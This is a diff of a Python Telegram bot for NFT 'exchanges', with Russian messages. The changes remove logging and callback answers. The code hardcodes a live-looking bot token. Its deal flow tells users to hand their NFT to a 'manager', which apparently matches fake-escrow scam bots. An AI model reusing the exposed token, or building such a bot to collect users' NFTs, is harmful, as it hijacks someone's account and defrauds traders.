@@ -1,10 +1,7 @@
-# NFT Exchange Bot для iPhone
-# ПОЛНОСТЬЮ РАБОЧАЯ ВЕРСИЯ - все кнопки реагируют!
-
 import requests
 import time
 import uuid
-from datetime import datetime
+from datetime import datetime 
 
 # ===== НАСТРОЙКИ =====
 TOKEN = "8487741416:AAHlISX26SKheAnTQJCv1rPHY-X0f3fWdI0"
@@ -54,12 +51,10 @@ def send_message(chat_id, text, keyboard=None, parse_mode="HTML"):
     }
     if keyboard:
         data["reply_markup"] = keyboard
-    
     try:
-        r = requests.post(url, json=data)
-        print(f"Send message to {chat_id}: {r.status_code}")
-    except Exception as e:
-        print(f"Send error: {e}")
+        requests.post(url, json=data)
+    except:
+        pass
 
 def send_inline_keyboard(chat_id, text, buttons, parse_mode="HTML"):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
@@ -71,10 +66,9 @@ def send_inline_keyboard(chat_id, text, buttons, parse_mode="HTML"):
         "parse_mode": parse_mode
     }
     try:
-        r = requests.post(url, json=data)
-        print(f"Send inline to {chat_id}: {r.status_code}")
-    except Exception as e:
-        print(f"Send inline error: {e}")
+        requests.post(url, json=data)
+    except:
+        pass
 
 def edit_message(chat_id, message_id, text, keyboard=None, parse_mode="HTML"):
     url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
@@ -87,19 +81,6 @@ def edit_message(chat_id, message_id, text, keyboard=None, parse_mode="HTML"):
     if keyboard:
         data["reply_markup"] = keyboard
     try:
-        r = requests.post(url, json=data)
-        print(f"Edit message {message_id}: {r.status_code}")
-    except Exception as e:
-        print(f"Edit error: {e}")
-
-def answer_callback(callback_id, text):
-    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
-    data = {
-        "callback_query_id": callback_id,
-        "text": text,
-        "show_alert": False
-    }
-    try:
         requests.post(url, json=data)
     except:
         pass
@@ -111,8 +92,6 @@ def handle_message(message):
     user_id = message['from']['id']
     username = message['from'].get('username', 'NoUsername')
     first_name = message['from'].get('first_name', 'Пользователь')
-    
-    print(f"Message from {user_id}: {text}")
     
     # Проверка на бан
     if user_id in banned_users:
@@ -206,7 +185,8 @@ def handle_message(message):
             send_message(chat_id, "<b>🏆 ТОП-15 ОБМЕНОВ ПОКА ПУСТ. БУДЬТЕ ПЕРВЫМИ!</b>")
         else:
             top_text = "<b>🏆 ТОП-15 ЛУЧШИХ ОБМЕНОВ (от $100 до $300)</b>\n\n"
-            for i, deal in enumerate(sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15], 1):
+            sorted_deals = sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15]
+            for i, deal in enumerate(sorted_deals, 1):
                 top_text += f"<b>{i}. {deal['user1']} ↔ {deal['user2']} — ${deal['amount']}</b>\n"
             send_message(chat_id, top_text)
     
@@ -372,9 +352,6 @@ def handle_callback(callback):
     data = callback['data']
     user_id = callback['from']['id']
     username = callback['from'].get('username', 'NoUsername')
-    callback_id = callback['id']
-    
-    print(f"Callback from {user_id}: {data}")
     
     # ===== ПРИНЯТЬ СДЕЛКУ =====
     if data.startswith('accept_'):
@@ -382,25 +359,21 @@ def handle_callback(callback):
         
         if deal_id not in deals:
             edit_message(chat_id, message_id, "<b>❌ Сделка не найдена!</b>")
-            answer_callback(callback_id, "Ошибка")
             return
         
         deal = deals[deal_id]
         
         if deal['status'] != 'waiting':
             edit_message(chat_id, message_id, "<b>❌ Сделка уже недоступна!</b>")
-            answer_callback(callback_id, "Сделка занята")
             return
         
         if user_id == deal['creator_id']:
             edit_message(chat_id, message_id, "<b>❌ Нельзя принять свою сделку!</b>")
-            answer_callback(callback_id, "Это ваша сделка")
             return
         
         # Проверяем, что принимает нужный пользователь
         if username != deal['second_user'] and f"@{username}" != f"@{deal['second_user']}":
             edit_message(chat_id, message_id, "<b>❌ Эта сделка создана для другого пользователя!</b>")
-            answer_callback(callback_id, "Не ваш чат")
             return
         
         deal['participant_id'] = user_id
@@ -416,8 +389,9 @@ def handle_callback(callback):
                 'date': datetime.now().strftime("%Y-%m-%d")
             })
             # Сортируем и оставляем топ-15
-            global top_deals
-            top_deals = sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15]
+            top_deals.sort(key=lambda x: x['amount'], reverse=True)
+            while len(top_deals) > 15:
+                top_deals.pop()
         
         # Уведомление создателю
         send_message(
@@ -433,7 +407,6 @@ def handle_callback(callback):
             f"<b>✅ ВЫ ПРИНЯЛИ СДЕЛКУ #{deal_id}</b>\n\n"
             f"<b>Ожидайте передачи NFT менеджеру.</b>"
         )
-        answer_callback(callback_id, "Сделка принята!")
     
     # ===== ОТМЕНИТЬ СДЕЛКУ =====
     elif data.startswith('cancel_'):
@@ -442,7 +415,6 @@ def handle_callback(callback):
         if deal_id in deals and deals[deal_id]['creator_id'] == user_id:
             deals[deal_id]['status'] = 'cancelled'
             edit_message(chat_id, message_id, f"<b>❌ СДЕЛКА #{deal_id} ОТМЕНЕНА</b>")
-            answer_callback(callback_id, "Отменено")
     
     # ===== ГЛАВНОЕ МЕНЮ =====
     elif data == "main_menu":
@@ -454,7 +426,6 @@ def handle_callback(callback):
 👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:
         """
         send_message(chat_id, welcome_text, main_keyboard())
-        answer_callback(callback_id, "Главное меню")
     
     # ===== КАК ПРОХОДИТ СДЕЛКА =====
     elif data == "how_deal":
@@ -478,7 +449,6 @@ def handle_callback(callback):
 • <b>Сделка завершена успешно! ✅</b>
         """
         send_message(chat_id, deal_text)
-        answer_callback(callback_id, "Информация")
     
     # ===== АДМИН: СТАТИСТИКА =====
     elif data == "admin_stats" and user_id == ADMIN_ID:
@@ -490,19 +460,16 @@ def handle_callback(callback):
 <b>🏆 В топ-15:</b> {len(top_deals)}
         """
         edit_message(chat_id, message_id, stats_text, admin_keyboard())
-        answer_callback(callback_id, "Статистика")
     
     # ===== АДМИН: РАССЫЛКА =====
     elif data == "admin_broadcast" and user_id == ADMIN_ID:
         users[user_id]['state'] = 'admin_broadcast'
         edit_message(chat_id, message_id, "<b>📢 Введите текст рассылки:</b>")
-        answer_callback(callback_id, "Режим рассылки")
     
     # ===== АДМИН: ВСЕ СДЕЛКИ =====
     elif data == "admin_deals" and user_id == ADMIN_ID:
         if not deals:
             edit_message(chat_id, message_id, "<b>📭 Нет сделок</b>", admin_keyboard())
-            answer_callback(callback_id, "Пусто")
             return
         
         deals_text = "<b>📋 СДЕЛКИ:</b>\n\n"
@@ -511,7 +478,6 @@ def handle_callback(callback):
             deals_text += f"{status_emoji} <b>{deal_id}</b>: @{deal['creator_name']} ↔ @{deal['second_user']} (${deal['amount']})\n"
         
         edit_message(chat_id, message_id, deals_text, admin_keyboard())
-        answer_callback(callback_id, "Список сделок")
     
     # ===== АДМИН: ЗАКРЫТЬ =====
     elif data == "admin_close" and user_id == ADMIN_ID:
@@ -523,14 +489,13 @@ def handle_callback(callback):
 👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:
         """
         send_message(chat_id, welcome_text, main_keyboard())
-        answer_callback(callback_id, "Админка закрыта")
 
 # ===== ЗАПУСК =====
 def main():
     print("🚀 NFT Exchange Bot запущен!")
     print(f"🤖 Бот: @{BOT_USERNAME}")
     print(f"👑 Админ ID: {ADMIN_ID}")
-    print("✅ Все кнопки работают!")
+    print("✅ Нажми Ctrl+C для остановки")
     
     offset = 0
     while True:
